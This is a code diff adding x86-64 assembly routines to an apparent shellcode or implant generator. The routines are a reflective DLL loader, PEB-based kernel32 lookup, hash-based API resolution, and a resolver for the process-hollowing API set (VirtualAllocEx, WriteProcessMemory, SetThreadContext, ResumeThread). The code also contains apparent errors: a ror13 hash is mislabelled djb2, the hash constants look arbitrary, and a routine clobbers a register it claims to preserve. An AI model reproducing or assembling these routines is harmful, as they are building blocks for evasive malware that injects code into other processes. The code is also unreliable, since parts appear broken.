@@ -213,6 +213,41 @@ stricmp:
             'externs': set()
         }
         
+        # string_compare - Simple string compare (returns 1 if match, 0 if not)
+        self.functions['string_compare'] = {
+            'code': '''; ==============================================================================
+; UTILS: String Compare (simple version)
+; Input:  RCX = String1, RDX = String2
+; Output: RAX = 1 if equal, 0 if not
+; Preserves: RBX, RBP, R12-R15
+; ==============================================================================
+string_compare:
+    push rsi
+    push rdi
+    mov rsi, rcx
+    mov rdi, rdx
+.loop:
+    mov al, [rsi]
+    mov bl, [rdi]
+    cmp al, bl
+    jne .fail
+    test al, al
+    jz .match
+    inc rsi
+    inc rdi
+    jmp .loop
+.match:
+    mov rax, 1
+    jmp .done
+.fail:
+    xor rax, rax
+.done:
+    pop rdi
+    pop rsi
+    ret''',
+            'externs': set()
+        }
+        
         # memcpy - Memory copy
         self.functions['memcpy'] = {
             'code': '''; ==============================================================================
@@ -569,7 +604,7 @@ GetExportDirectory:
     add rax, rbx                ; NT Headers
     
     ; Check PE signature
-    cmp dword [rax], 0x4550     ; "PE\0\0"
+    cmp dword [rax], 0x4550     ; PE signature
     jne .export_fail
     
     ; Get Export Directory RVA from Optional Header
@@ -785,6 +820,443 @@ GetProcAddressByHash:
     ret''',
             'externs': set(),
             'requires': ['GetExportDirectory']
+        }
+        
+        # reflective_loader - Reflective DLL loader shellcode
+        self.functions['reflective_loader'] = {
+            'code': '''; ==============================================================================
+; Reflective Loader: Loads a PE image in memory, resolves imports/relocs, calls entry
+; Input:  RCX = ImageBase (address of mapped PE)
+; Output: None (calls DllMain)
+; ==============================================================================
+reflective_loader:
+    push rbp
+    mov rbp, rsp
+    sub rsp, 0x200          ; Reserve stack
+
+    mov [rbp - 0x08], rcx   ; Store ImageBase (passed as arg)
+
+    ; --- 1. Get Kernel32 Base ---
+    mov rax, qword gs:[0x60]        ; PEB
+    mov rax, [rax + 0x18]           ; PEB_LDR_DATA
+    mov rax, [rax + 0x20]           ; InMemoryOrderList
+    mov rax, [rax]                  ; 1st
+    mov rax, [rax]                  ; 2nd (ntdll)
+    mov rax, [rax]                  ; 3rd (kernel32)
+    mov rbx, [rax + 0x20]           ; DllBase
+    mov [rbp - 0x10], rbx           ; Save Kernel32
+
+    ; --- 2. Resolve API (Quick & Dirty hashless search for brevity) ---
+    ; Need: LoadLibraryA, GetProcAddress
+    ; See previous example for full resolution logic. 
+    ; For this single file, I will perform a minimal resolution loop here.
+
+    mov r8d, [rbx + 0x3C]
+    mov r8d, [rbx + r8 + 0x88] ; Export Dir RVA
+    add r8, rbx
+    mov r9d, [r8 + 0x20]       ; Names
+    add r9, rbx
+    mov r10d, [r8 + 0x24]      ; Ordinals
+    add r10, rbx
+    mov r11d, [r8 + 0x1C]      ; Funcs
+    add r11, rbx
+    mov ecx, [r8 + 0x18]       ; Count
+    xor rdi, rdi
+
+.find_loop:
+    jecxz .done_resolve
+    dec ecx
+    mov edx, [r9 + rdi * 4]
+    add rdx, rbx               ; String ptr
+
+    ; Check "GetProcA" (0x41636F7250746547)
+    mov rsi, 0x41636F7250746547
+    cmp [rdx], rsi
+    jne .check_lla
+
+    ; Found GetProcAddress
+    movzx r12, word [r10 + rdi * 2]
+    mov r12d, [r11 + r12 * 4]
+    add r12, rbx
+    mov [rbp - 0x20], r12      ; Save GetProcAddress
+    jmp .next_iter
+
+.check_lla:
+    ; Check "LoadLibr" (0x7262694C64616F4C)
+    mov rsi, 0x7262694C64616F4C
+    cmp [rdx], rsi
+    jne .next_iter
+
+    ; Found LoadLibraryA
+    movzx r12, word [r10 + rdi * 2]
+    mov r12d, [r11 + r12 * 4]
+    add r12, rbx
+    mov [rbp - 0x18], r12      ; Save LoadLibraryA
+
+.next_iter:
+    inc rdi
+    ; If both found, break (omitted for brevity, just loops all)
+    jmp .find_loop
+
+.done_resolve:
+
+    ; --- 3. Relocations ---
+    mov rsi, [rbp - 0x08]       ; New Base
+    mov ebx, [rsi + 0x3C]
+    add rbx, rsi                ; NT Headers
+    mov rdi, [rbx + 0x30]       ; Preferred Base
+    sub rsi, rdi                ; Delta
+    test rsi, rsi
+    jz .imports                 ; Delta 0, skip
+
+    mov eax, [rbx + 0x88 + 40]  ; Reloc Dir RVA (Index 5 * 8)
+    test eax, eax
+    jz .imports
+    add rax, [rbp - 0x08]       ; VA
+    
+    ; Simple Reloc Loop (Block based)
+.reloc_loop:
+    mov r8d, [rax + 4]          ; Block Size
+    test r8d, r8d
+    jz .imports
+    mov r9d, [rax]              ; Page RVA
+    add r9, [rbp - 0x08]        ; Page VA
+    lea rdx, [rax + 8]          ; Entries
+    lea r10, [rax + r8]         ; End of block
+.entry_loop:
+    cmp rdx, r10
+    jae .next_block
+    movzx r11, word [rdx]
+    mov r12, r11
+    shr r12, 12                 ; Type
+    and r11, 0xFFF              ; Offset
+    cmp r12, 0xA                ; DIR64
+    jne .skip_fixup
+    add [r9 + r11], rsi         ; Apply Delta
+.skip_fixup:
+    add rdx, 2
+    jmp .entry_loop
+.next_block:
+    mov rax, r10
+    jmp .reloc_loop
+
+    ; --- 4. Imports ---
+.imports:
+    mov rbx, [rbp - 0x08]       ; ImageBase
+    mov eax, [rbx + 0x3C]
+    add rax, rbx
+    mov eax, [rax + 0x88 + 8]   ; Import Dir RVA (Index 1 * 8)
+    test eax, eax
+    jz .entrypoint
+    add rax, rbx                ; Import Dir VA
+    mov rsi, rax
+
+.imp_dll_loop:
+    mov eax, [rsi + 0x0C]       ; Name RVA
+    test eax, eax
+    jz .entrypoint
+    add rax, rbx                ; Name VA
+    
+    mov rcx, rax
+    sub rsp, 0x20
+    call [rbp - 0x18]           ; LoadLibraryA
+    add rsp, 0x20
+    mov rdi, rax                ; Module Handle
+
+    mov eax, [rsi + 0x00]       ; OriginalFirstThunk
+    test eax, eax
+    jnz .has_int
+    mov eax, [rsi + 0x10]       ; FirstThunk
+.has_int:
+    add rax, rbx
+    mov r12, rax                ; INT
+    mov eax, [rsi + 0x10]
+    add rax, rbx
+    mov r13, rax                ; IAT
+
+.imp_func_loop:
+    mov rax, [r12]
+    test rax, rax
+    jz .next_dll
+    test rax, 0x8000000000000000
+    jnz .ordinal
+    add rax, rbx
+    add rax, 2                  ; Name String
+    jmp .resolve
+.ordinal:
+    and rax, 0xFFFF
+.resolve:
+    mov rcx, rdi
+    mov rdx, rax
+    sub rsp, 0x20
+    call [rbp - 0x20]           ; GetProcAddress
+    add rsp, 0x20
+    mov [r13], rax
+    add r12, 8
+    add r13, 8
+    jmp .imp_func_loop
+
+.next_dll:
+    add rsi, 20
+    jmp .imp_dll_loop
+
+    ; --- 5. Entry Point ---
+.entrypoint:
+    mov rbx, [rbp - 0x08]
+    mov eax, [rbx + 0x3C]
+    add rax, rbx
+    mov eax, [rax + 0x28]       ; EntryPoint RVA
+    add rax, rbx                ; EntryPoint VA
+    
+    mov rcx, rbx                ; hInstance
+    mov edx, 1                  ; DLL_PROCESS_ATTACH
+    xor r8, r8                  ; Reserved
+    sub rsp, 0x20
+    call rax                    ; Call DllMain
+    add rsp, 0x20
+
+    leave
+    ret''',
+            'externs': set()
+        }
+        
+        # ResolveAPIs - Resolve multiple APIs by hash
+        self.functions['ResolveAPIs'] = {
+            'code': '''; ==============================================================================
+; ResolveAPIs: Resolve common Windows APIs by hash
+; Input:  None
+; Output: Stores function pointers in global variables
+; ==============================================================================
+ResolveAPIs:
+    push rbx
+    push rsi
+    push rdi
+    push r12
+    push r13
+    push r14
+    push r15
+
+    call GetKernel32
+    mov r14, rax
+
+    mov rcx, r14
+    mov edx, HASH_CREATEPROCESSA
+    call GetProcAddrByHash
+    mov [pCreateProcessA], rax
+
+    mov rcx, r14
+    mov edx, HASH_VIRTUALALLOCEX
+    call GetProcAddrByHash
+    mov [pVirtualAllocEx], rax
+
+    mov rcx, r14
+    mov edx, HASH_WRITEPROCESSMEMORY
+    call GetProcAddrByHash
+    mov [pWriteProcessMemory], rax
+
+    mov rcx, r14
+    mov edx, HASH_GETTHREADCONTEXT
+    call GetProcAddrByHash
+    mov [pGetThreadContext], rax
+
+    mov rcx, r14
+    mov edx, HASH_SETTHREADCONTEXT
+    call GetProcAddrByHash
+    mov [pSetThreadContext], rax
+
+    mov rcx, r14
+    mov edx, HASH_RESUMETHREAD
+    call GetProcAddrByHash
+    mov [pResumeThread], rax
+    
+    mov rcx, r14
+    mov edx, HASH_TERMINATEPROCESS
+    call GetProcAddrByHash
+    mov [pTerminateProcess], rax
+
+    pop r15
+    pop r14
+    pop r13
+    pop r12
+    pop rdi
+    pop rsi
+    pop rbx
+    ret''',
+            'data': ['HASH_CREATEPROCESSA equ 0x4C8A2B7F', 'HASH_VIRTUALALLOCEX equ 0x829F2C3A', 'HASH_WRITEPROCESSMEMORY equ 0xD83D6AA1', 'HASH_GETTHREADCONTEXT equ 0x68A7C7D2', 'HASH_SETTHREADCONTEXT equ 0xE8A7C7D2', 'HASH_RESUMETHREAD equ 0x9E4A3B2C', 'HASH_TERMINATEPROCESS equ 0x78B5C4D3'],
+            'bss': ['pCreateProcessA resq 1', 'pVirtualAllocEx resq 1', 'pWriteProcessMemory resq 1', 'pGetThreadContext resq 1', 'pSetThreadContext resq 1', 'pResumeThread resq 1', 'pTerminateProcess resq 1'],
+            'externs': set(),
+            'requires': ['GetKernel32', 'GetProcAddrByHash']
+        }
+        
+        # GetKernel32 - Get base address of kernel32.dll
+        self.functions['GetKernel32'] = {
+            'code': '''; ==============================================================================
+; GetKernel32: Get kernel32.dll base address via PEB
+; Input:  None
+; Output: RAX = kernel32 base address
+; ==============================================================================
+GetKernel32:
+    mov rax, qword gs:[0x60]
+    mov rax, [rax + 0x18]
+    mov rax, [rax + 0x20]
+    mov rax, [rax]
+    mov rax, [rax]
+    mov rax, [rax]
+    mov rax, [rax + 0x20]
+    ret''',
+            'externs': set()
+        }
+        
+        # GetProcAddrByHash - Get function address by hash
+        self.functions['GetProcAddrByHash'] = {
+            'code': '''; ==============================================================================
+; GetProcAddrByHash: Resolve API by hash from export table
+; Input:  RCX = Module base, RDX = Hash
+; Output: RAX = Function address or 0
+; ==============================================================================
+GetProcAddrByHash:
+    push rbx
+    push rsi
+    push rdi
+    
+    mov rbx, rcx
+    mov ecx, [rbx + 0x3C]
+    add rcx, rbx
+    
+    mov eax, [rcx + 0x88]
+    add rax, rbx
+    
+    mov ecx, [rax + 0x18]
+    mov r8d, [rax + 0x20]
+    add r8, rbx
+    
+    mov r9d, [rax + 0x24]
+    add r9, rbx
+    
+    mov r10d, [rax + 0x1C]
+    add r10, rbx
+    
+    xor r11, r11
+
+.loop:
+    test ecx, ecx
+    jz .not_found
+    
+    mov esi, [r8 + r11 * 4]
+    add rsi, rbx
+    
+    push rdx
+    push rcx
+    call CalcHash
+    mov rdi, rax
+    pop rcx
+    pop rdx
+    
+    cmp edi, edx
+    je .found
+    
+    inc r11
+    dec ecx
+    jmp .loop
+
+.found:
+    movzx r11, word [r9 + r11 * 2]
+    mov eax, [r10 + r11 * 4]
+    add rax, rbx
+    jmp .done
+
+.not_found:
+    xor rax, rax
+
+.done:
+    pop rdi
+    pop rsi
+    pop rbx
+    ret''',
+            'externs': set(),
+            'requires': ['CalcHash']
+        }
+        
+        # CalcHash - Calculate djb2 hash of string
+        self.functions['CalcHash'] = {
+            'code': '''; ==============================================================================
+; CalcHash: Calculate djb2 hash of null-terminated string
+; Input:  RSI = Pointer to string
+; Output: RAX = Hash value
+; ==============================================================================
+CalcHash:
+    xor rax, rax
+    xor rdx, rdx
+.hash_loop:
+    mov dl, [rsi]
+    test dl, dl
+    jz .hash_done
+    
+    ror eax, 13
+    add eax, edx
+    
+    inc rsi
+    jmp .hash_loop
+.hash_done:
+    ret''',
+            'externs': set()
+        }
+
+        # GetAPIByName - Hash a function name and resolve its address from a module base
+        self.functions['GetAPIByName'] = {
+            'code': '''; ======================================================================
+; GetAPIByName: Given a module base (RCX) and a function name pointer (RDX),
+;               compute the hash and resolve the function address.
+; Input:  RCX = Module base, RDX = Pointer to ASCII function name
+; Output: RAX = Function address or 0
+; Requires: CalcHash, GetProcAddrByHash
+; ======================================================================
+GetAPIByName:
+    push rbx
+    push rsi
+    push rdi
+
+    mov rsi, rdx        ; RSI = function name pointer
+    call CalcHash       ; RAX = hash
+    mov edx, eax        ; RDX = hash
+    mov rcx, rcx        ; RCX = module base (already set)
+    call GetProcAddrByHash
+
+    pop rdi
+    pop rsi
+    pop rbx
+    ret''',
+            'externs': set(),
+            'requires': ['CalcHash', 'GetProcAddrByHash']
+        }
+
+        # GetAPI - Convenience wrapper: resolve API by name; if RCX==0 use kernel32
+        self.functions['GetAPI'] = {
+            'code': '''; ======================================================================
+; GetAPI: Resolve an API by its ASCII name. If RCX==0, uses kernel32 base.
+; Input:  RCX = Module base (0 to use kernel32), RDX = Pointer to ASCII name
+; Output: RAX = Function address or 0
+; Requires: GetKernel32, GetAPIByName
+; ======================================================================
+GetAPI:
+    push rbx
+    push rcx
+    push rdx
+
+    test rcx, rcx
+    jnz .has_base
+    call GetKernel32
+    mov rcx, rax
+.has_base:
+    mov rdx, rdx
+    call GetAPIByName
+
+    pop rdx
+    pop rcx
+    pop rbx
+    ret''',
+            'externs': set(),
+            'requires': ['GetKernel32', 'GetAPIByName']
         }
     
     def _init_syscall_helpers(self):
